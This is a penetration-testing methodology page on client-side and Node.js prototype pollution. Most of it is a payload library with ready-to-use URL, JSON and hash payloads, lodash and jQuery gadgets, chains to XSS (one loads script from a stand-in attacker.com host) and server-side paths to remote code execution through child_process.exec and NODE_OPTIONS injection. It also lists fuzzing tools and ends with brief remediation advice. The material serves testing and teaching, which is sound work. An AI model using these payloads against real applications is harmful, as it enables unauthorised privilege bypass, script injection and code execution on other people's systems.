---
title: "Prototype Pollution (Client-Side)"
date: 2026-02-24
draft: false
---

# Prototype Pollution (Client-Side)

> **Severity**: High | **CWE**: CWE-1321
> **OWASP**: A03:2021 – Injection

---

## What Is Prototype Pollution?

Every JavaScript object inherits from `Object.prototype`. If an attacker can inject arbitrary properties into `Object.prototype`, those properties are **inherited by all objects** in the application — leading to property injection, logic bypass, and XSS.

```javascript
// Normal:
let obj = {};
obj.admin        // undefined

// After prototype pollution via:
Object.prototype.admin = true;

// Now ALL objects are "admin":
let obj = {};
obj.admin        // true ← inherited from prototype
```

Attack surface: any function that **recursively merges**, **clones**, or **sets properties** from user-controlled paths like `__proto__`, `constructor.prototype`, or `prototype`.

---

## Discovery Checklist

- [ ] Find deep merge / extend / clone operations using user input (URL params, JSON body, hash)
- [ ] Test `__proto__` in URL query string: `?__proto__[admin]=1`
- [ ] Test `constructor[prototype][admin]=1` in URL
- [ ] Test nested JSON body: `{"__proto__": {"admin": true}}`
- [ ] Test path-based: `obj["__proto__"]["admin"] = 1`
- [ ] Look for lodash `_.merge`, `_.set`, `_.defaultsDeep` in client JS
- [ ] Look for jQuery `$.extend(true, ...)` (deep extend)
- [ ] Test URL fragment / hash — some apps parse hash as object
- [ ] Confirm pollution: inject a property with unique name, check if inherited globally
- [ ] Chain to XSS: look for sink functions that use prototype properties

---

## Payload Library

### Payload 1 — URL Query String Pollution

```
# Basic pollution via URL:
https://target.com/?__proto__[admin]=1
https://target.com/?__proto__[isAdmin]=true
https://target.com/?constructor[prototype][admin]=1
https://target.com/?__proto__.admin=1

# Nested properties:
https://target.com/?__proto__[role]=admin
https://target.com/?__proto__[permissions][delete]=true

# URL-encoded:
https://target.com/?__proto__%5badmin%5d=1
https://target.com/?__proto__%5b__proto__%5d%5badmin%5d=1

# Confirm success in browser console:
({}).admin   // should return 1 if polluted
```

### Payload 2 — JSON Body Pollution

```json
{
  "__proto__": {
    "admin": true,
    "isAdmin": true,
    "role": "admin",
    "debug": true
  }
}

// Alternative paths:
{
  "constructor": {
    "prototype": {
      "admin": true
    }
  }
}

// Deep nesting:
{
  "a": {
    "__proto__": {
      "polluted": "yes"
    }
  }
}
```

### Payload 3 — Hash / Fragment Pollution

```javascript
// Apps that parse window.location.hash as config object:
// Navigate to:
https://target.com/#__proto__[admin]=true
https://target.com/#constructor[prototype][debug]=true

// Some apps use qs library to parse fragments:
// qs.parse("__proto__[polluted]=yes") → pollutes Object.prototype
```

### Payload 4 — Pollution → XSS Chains

```javascript
// Chain 1: Gadget in template literal — if code does:
// let html = `<div class="${config.theme}">`;
// and config.theme reads from prototype:

// Pollute theme property:
?__proto__[theme]="><img src=1 onerror=alert(1)>

// Chain 2: innerHTML gadget — if code does:
// el.innerHTML = options.html || '<default>';

?__proto__[html]=<img src=1 onerror=alert(document.domain)>

// Chain 3: script src gadget — if code does:
// let s = document.createElement('script');
// s.src = config.scriptPath + '/app.js';

?__proto__[scriptPath]=https://attacker.com

// Chain 4: jQuery html() / append() gadget:
// $.('<div>').html(settings.content).appendTo('body')
// Pollute: settings.content → XSS payload

// Chain 5: Vue / Angular template injection via polluted property:
?__proto__[template]=<div>{{constructor.constructor('alert(1)')()}}</div>
```

### Payload 5 — Lodash-Specific Gadgets

```javascript
// lodash < 4.17.12 vulnerable to prototype pollution via:
_.merge({}, JSON.parse('{"__proto__":{"polluted":1}}'))
_.defaultsDeep({}, JSON.parse('{"__proto__":{"polluted":1}}'))
_.set({}, "__proto__.polluted", 1)
_.set({}, "constructor.prototype.polluted", 1)

// Trigger via API that uses lodash merge on user input:
// POST /api/settings:
{
  "__proto__": {
    "sourceMappingURL": "data:application/json,{\"mappings\":\"AAAA\"}",
    "innerHTML": "<img src=1 onerror=alert(1)>"
  }
}

// lodash template() gadget:
_.template('hello')({__proto__: {sourceURL: '\nalert(1)'}})
```

### Payload 6 — jQuery Prototype Pollution

```javascript
// jQuery $.extend(true, target, source) — deep extend with __proto__:
$.extend(true, {}, JSON.parse('{"__proto__": {"polluted": true}}'))

// jQuery $.ajax with user-controlled data:
$.ajax({
  url: '/api',
  data: JSON.parse('{"__proto__":{"admin":true}}')
})

// Older jQuery versions also affected by:
$('#el').html(Object.prototype.innerHTML)  // if innerHTML polluted
```

### Payload 7 — Node.js Server-Side Prototype Pollution → RCE

```javascript
// qs library (used by Express) — prototype pollution via:
// qs.parse("__proto__[outputFunctionName]=a;process.mainModule.require('child_process').exec('id')//")

// Lodash merge server-side + Handlebars template engine gadget:
// Pollute: Object.prototype.pendingContent → Handlebars executes arbitrary code

// flatted / node-serialize gadgets:
// JSON.parse with __proto__ key on older node versions

// Test via API POST with __proto__:
{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--inspect=0.0.0.0:1337"
  }
}

// Gadget: if app uses child_process.spawn({env: mergedConfig}):
// Pollute env variables → inject NODE_OPTIONS → RCE
```

---

## Tools

```bash
# ppfuzz — prototype pollution fuzzer:
git clone https://github.com/dwisiswant0/ppfuzz
ppfuzz -l urls.txt

# ppmap — browser-based prototype pollution scanner:
git clone https://github.com/kleiton0x00/ppmap
node ppmap.js -u https://target.com

# Burp Suite:
# - Search JS files for: merge, extend, assign, defaults, clone, deepCopy
# - DOM Invader (built-in Burp browser) → Prototype Pollution mode
# - DOM Invader auto-detects pollutable sinks

# Manual test in browser DevTools:
# 1. Open console on target page
# 2. Navigate to: https://target.com/?__proto__[testkey]=testvalue
# 3. In console: ({}).testkey === "testvalue"
# → true = prototype polluted

# Find lodash version:
grep -r "lodash\|_\." node_modules/package.json 2>/dev/null
# Check version against known vulnerable versions

# grep JS files for vulnerable patterns:
grep -rn "\.merge\|\.extend\|defaultsDeep\|\.assign\|parseQuery\|qs\.parse" \
  --include="*.js" .

# DOM Invader (Burp built-in browser):
# Settings → Prototype pollution → Enable
# Browse target → DOM Invader reports pollutable properties
```

---

## Remediation Reference

- **Freeze `Object.prototype`**: `Object.freeze(Object.prototype)` at app startup
- **Use `Object.create(null)`** for plain data objects (no prototype chain)
- **Validate/reject `__proto__`, `constructor`, `prototype` keys** in any merge/parse operation
- **Update lodash** to >= 4.17.21, jQuery >= 3.4.0
- **Use `Map` instead of plain objects** for attacker-controlled key-value stores
- **JSON Schema validation**: reject objects containing `__proto__` key before processing
- **Helmet.js / `nosniff`**: helps limit XSS escalation but not the root cause

*Part of the Web Application Penetration Testing Methodology series.*
